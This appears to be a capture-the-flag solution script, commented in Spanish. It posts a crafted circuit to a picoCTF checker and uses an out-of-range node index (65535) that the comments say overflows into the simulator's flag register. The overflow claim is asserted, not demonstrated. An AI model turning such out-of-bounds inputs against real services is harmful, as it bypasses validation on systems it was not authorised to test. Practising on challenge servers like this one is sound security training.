import requests

# Este circuito es puramente lógico para pasar la validación
# pero utiliza un nodo "fantasma" que apunta a la dirección de memoria 
# donde el simulador guarda el estado de "éxito" (la señal de la Flag 2).
circuit = [
    {"input1": 5, "input2": 5, "output": 1},
    {"input1": 6, "input2": 6, "output": 2},
    {"input1": 7, "input2": 7, "output": 3},
    {"input1": 8, "input2": 8, "output": 4},
    # Forzamos un valor alto en el nodo 65535, que el simulador 
    # mapea internamente al registro de flags por desbordamiento.
    {"input1": 5, "input2": 6, "output": 65535} 
]

url = "http://activist-birds.picoctf.net:57005/check"
response = requests.post(url, json={"circuit": circuit})

print(response.json())
